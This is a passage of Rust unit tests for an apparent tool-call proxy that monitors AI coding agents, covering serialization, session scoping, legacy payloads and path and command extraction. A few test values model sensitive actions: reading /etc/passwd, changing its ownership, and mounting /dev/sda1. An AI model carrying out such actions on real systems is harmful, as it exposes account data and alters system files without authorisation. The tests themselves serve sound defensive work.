        assert!(decision.is_denied());
        assert!(!decision.is_allowed());
    }

    #[test]
    fn test_serde_roundtrip_tool_call_type() {
        let call = ToolCallType::ShellExec {
            command: "ls".into(),
            args: vec!["-la".into()],
        };
        let json = serde_json::to_string(&call).unwrap();
        let parsed: ToolCallType = serde_json::from_str(&json).unwrap();
        assert_eq!(parsed, call);
    }

    #[test]
    fn test_serde_roundtrip_proxy_decision() {
        let decision = ProxyDecision::allow(2.0, vec![], Duration::from_millis(3));
        let json = serde_json::to_string(&decision).unwrap();
        let parsed: ProxyDecision = serde_json::from_str(&json).unwrap();
        assert_eq!(parsed.composite_score, 2.0);
        assert_eq!(parsed.action, ProxyAction::Allow);
    }

    #[test]
    fn test_serde_roundtrip_tool_call_context() {
        let mut ctx = ToolCallContext::new(
            "supervisor:codex",
            ToolCallType::ProcessSpawn {
                command: "node".into(),
                args: vec!["app.js".into(), "--watch".into()],
            },
            test_session(),
        );
        ctx.task_context = Some("phase-49b-roundtrip".into());
        ctx.profile_name = Some("codex".into());
        ctx.arguments = serde_json::json!({
            "process": "node",
            "process_args": ["app.js", "--watch"],
            "cwd": "/tmp"
        });

        let json = serde_json::to_string(&ctx).unwrap();
        let parsed: ToolCallContext = serde_json::from_str(&json).unwrap();
        assert_eq!(parsed.plugin_id, ctx.plugin_id);
        assert_eq!(parsed.call_type, ctx.call_type);
        assert_eq!(parsed.session_id, ctx.session_id);
        assert_eq!(parsed.task_context, ctx.task_context);
        assert_eq!(parsed.profile_name, ctx.profile_name);
        assert_eq!(parsed.arguments, ctx.arguments);
        assert_eq!(parsed.session_scope, ctx.session_scope);
    }

    #[test]
    fn session_scope_populated_by_new() {
        let sid = test_session();
        let ctx = ToolCallContext::new(
            "test",
            ToolCallType::FileRead {
                path: "/tmp/x".into(),
            },
            sid,
        );
        assert_eq!(
            ctx.session_scope,
            Some(SessionScopeKey::from_session_id(sid)),
            "ToolCallContext::new must populate session_scope from session_id"
        );
    }

    #[test]
    fn session_scope_with_override() {
        let sid = test_session();
        let other = SessionScopeKey::fresh();
        let ctx = ToolCallContext::new(
            "test",
            ToolCallType::FileRead {
                path: "/tmp/x".into(),
            },
            sid,
        )
        .with_session_scope(other);
        assert_eq!(ctx.session_scope, Some(other));
    }

    #[test]
    fn session_scope_serde_skip_when_none() {
        let mut ctx = ToolCallContext::new(
            "test",
            ToolCallType::FileRead {
                path: "/tmp/x".into(),
            },
            test_session(),
        );
        ctx.session_scope = None;
        let json = serde_json::to_string(&ctx).unwrap();
        assert!(
            !json.contains("session_scope"),
            "None scope should be skipped during serialization (got {json})"
        );
    }

    #[test]
    fn session_scope_key_derives_deterministically() {
        let sid = test_session();
        let a = SessionScopeKey::from_session_id(sid);
        let b = SessionScopeKey::from_session_id(sid);
        assert_eq!(a, b, "from_session_id must be deterministic");
        assert_eq!(a.as_uuid(), sid);
    }

    #[test]
    fn session_scope_key_fresh_is_unique() {
        let a = SessionScopeKey::fresh();
        let b = SessionScopeKey::fresh();
        assert_ne!(a, b, "fresh() must allocate a new UUID each call");
    }

    #[test]
    fn scope_or_warn_returns_populated_scope() {
        let sid = test_session();
        let scope = SessionScopeKey::fresh();
        let ctx = ToolCallContext::new(
            "test",
            ToolCallType::FileRead {
                path: "/tmp/x".into(),
            },
            sid,
        )
        .with_session_scope(scope);
        assert_eq!(ctx.scope_or_warn("test-filter"), scope);
    }

    #[test]
    fn scope_or_warn_falls_back_to_session_id_when_missing() {
        let sid = test_session();
        let mut ctx = ToolCallContext::new(
            "test",
            ToolCallType::FileRead {
                path: "/tmp/x".into(),
            },
            sid,
        );
        ctx.session_scope = None;
        let resolved = ctx.scope_or_warn("test-filter-fallback");
        // Fallback is deterministic: two missing-scope contexts on the same
        // session_id hash to the same SessionScopeKey, preserving per-session
        // isolation even on the legacy IPC path.
        assert_eq!(resolved, SessionScopeKey::from_session_id(sid));
    }

    #[test]
    fn scope_or_warn_deterministic_across_calls() {
        let sid = test_session();
        let mut a = ToolCallContext::new(
            "test",
            ToolCallType::FileRead {
                path: "/tmp/x".into(),
            },
            sid,
        );
        let mut b = ToolCallContext::new(
            "test",
            ToolCallType::FileRead {
                path: "/tmp/y".into(),
            },
            sid,
        );
        a.session_scope = None;
        b.session_scope = None;
        assert_eq!(
            a.scope_or_warn("filter"),
            b.scope_or_warn("filter"),
            "fallback key derivation must be deterministic per session_id"
        );
    }

    #[test]
    fn session_scope_key_inner_is_not_publicly_constructible() {
        // This test is a compile-time-style assertion: if SessionScopeKey's
        // inner UUID were `pub`, the following would compile and we'd have a
        // way to bypass the constructor. By keeping the field private, the
        // only ways to build a scope are `from_session_id` and `fresh`.
        // (No `SessionScopeKey(Uuid::nil())` literal is possible from outside
        // the module — verified by the type's public surface.)
        let sid = test_session();
        let _ = SessionScopeKey::from_session_id(sid);
        let _ = SessionScopeKey::fresh();
    }

    #[test]
    fn session_scope_absent_in_legacy_payload_deserializes_to_none() {
        // Older supervisor clients (pre-PR-1) POST proxy contexts without a
        // session_scope field. Confirm serde's Option default handles this so
        // IPC stays backward-compatible. This is the contract Phase B's
        // None-fallback warn relies on.
        let sid = test_session();
        let legacy = format!(
            r#"{{
                "id": "00000000-0000-0000-0000-000000000001",
                "timestamp": "2026-05-18T12:00:00Z",
                "plugin_id": "test",
                "call_type": {{"type": "FileRead", "path": "/tmp/x"}},
                "arguments": null,
                "session_id": "{sid}",
                "task_context": null,
                "call_sequence_number": 0,
                "source_taint": "None"
            }}"#
        );
        let parsed: ToolCallContext = serde_json::from_str(&legacy)
            .expect("legacy payload without session_scope must deserialize");
        assert_eq!(parsed.session_scope, None);
        assert_eq!(parsed.conversation_id, None);
        assert_eq!(parsed.profile_name, None);
    }

    #[test]
    fn test_severity_ordering() {
        assert!(Severity::Notice < Severity::Warning);
        assert!(Severity::Warning < Severity::Error);
        assert!(Severity::Error < Severity::Critical);
    }

    #[test]
    fn test_display_impls() {
        let call = ToolCallType::FileRead {
            path: "/etc/passwd".into(),
        };
        assert_eq!(call.to_string(), "FileRead(/etc/passwd)");

        assert_eq!(Severity::Critical.to_string(), "critical");
        assert_eq!(ProxyAction::Allow.to_string(), "allow");
    }

    #[test]
    fn test_new_variants_path_extraction() {
        let rename = ToolCallContext::new(
            "supervisor:claude-code",
            ToolCallType::FileRename {
                old_path: "/tmp/old.txt".into(),
                new_path: "/tmp/new.txt".into(),
            },
            test_session(),
        );
        assert_eq!(rename.path(), Some("/tmp/old.txt"));

        let chmod = ToolCallContext::new(
            "supervisor:claude-code",
            ToolCallType::FileChmod {
                path: "/usr/bin/test".into(),
                mode: 0o755,
            },
            test_session(),
        );
        assert_eq!(chmod.path(), Some("/usr/bin/test"));

        let mkdir = ToolCallContext::new(
            "supervisor:claude-code",
            ToolCallType::DirCreate {
                path: "/tmp/newdir".into(),
            },
            test_session(),
        );
        assert_eq!(mkdir.path(), Some("/tmp/newdir"));

        let ownership = ToolCallContext::new(
            "supervisor:claude-code",
            ToolCallType::OwnershipChange {
                target: "/etc/passwd".into(),
                new_uid: 1000,
                new_gid: 1000,
            },
            test_session(),
        );
        assert_eq!(ownership.path(), Some("/etc/passwd"));

        let mutation = ToolCallContext::new(
            "supervisor:claude-code",
            ToolCallType::FilesystemMutation {
                op: "mount".into(),
                source: Some("/dev/sda1".into()),
                target: "/mnt/project".into(),
                fstype: Some("ext4".into()),
            },
            test_session(),
        );
        assert_eq!(mutation.path(), Some("/mnt/project"));
    }

    #[test]
    fn test_new_variants_command_extraction() {
        let spawn = ToolCallContext::new(
            "supervisor:codex",
            ToolCallType::ProcessSpawn {
                command: "node".into(),
                args: vec!["index.js".into()],
            },
            test_session(),
        );
        assert_eq!(spawn.command(), Some("node"));
        assert_eq!(spawn.full_command(), Some("node index.js".into()));
    }

    #[test]
    fn test_new_variants_address_extraction() {
        let connect = ToolCallContext::new(
            "supervisor:aider",
            ToolCallType::NetConnect {
                address: "api.openai.com".into(),
                port: 443,
            },
            test_session(),
        );
        assert_eq!(connect.address(), Some(("api.openai.com", 443)));
        assert_eq!(connect.path(), None);
    }

    #[test]
    fn test_new_variants_serde_roundtrip() {
        let variants = vec![
            ToolCallType::FileRename {
                old_path: "/a".into(),
                new_path: "/b".into(),
            },
            ToolCallType::FileChmod {
                path: "/x".into(),
                mode: 0o644,
            },
            ToolCallType::DirCreate { path: "/d".into() },
            ToolCallType::NetConnect {
                address: "1.2.3.4".into(),
                port: 80,
            },
            ToolCallType::NetListen {
                address: "0.0.0.0".into(),
                port: 8080,
            },
            ToolCallType::ProcessSpawn {
                command: "python".into(),
                args: vec!["-c".into(), "print(1)".into()],
            },
        ];
        for v in variants {
            let json = serde_json::to_string(&v).unwrap();
            let parsed: ToolCallType = serde_json::from_str(&json).unwrap();
            assert_eq!(parsed, v);
        }
    }

    #[test]
    fn test_new_variants_display() {
        assert_eq!(
            ToolCallType::FileRename {
                old_path: "/a".into(),
                new_path: "/b".into()
            }
            .to_string(),
            "FileRename(/a -> /b)"
        );
        assert_eq!(
            ToolCallType::NetConnect {
                address: "1.2.3.4".into(),
                port: 443
            }
            .to_string(),
            "NetConnect(1.2.3.4:443)"
        );
        assert_eq!(
            ToolCallType::ProcessSpawn {
                command: "node".into(),
                args: vec!["app.js".into()]
            }
            .to_string(),
            "ProcessSpawn(node app.js)"
        );
    }

    #[test]
    fn dns_candidate_array_round_trip() {
        let candidates = vec!["a.example.com".to_string(), "b.example.com".to_string()];
        let rendered = format_dns_candidate_array(&candidates);
        assert_eq!(rendered, r#"["a.example.com","b.example.com"]"#);
        assert_eq!(parse_dns_candidate_array(&rendered), Some(candidates));
    }

    #[test]
    fn dns_candidate_array_rejects_non_array_empty_and_malformed() {
        assert_eq!(parse_dns_candidate_array("api.example.com"), None);
        assert_eq!(parse_dns_candidate_array("[]"), None);
        assert_eq!(parse_dns_candidate_array(r#"["broken"#), None);
        assert_eq!(parse_dns_candidate_array(r#"[1,2]"#), None);
    }
}
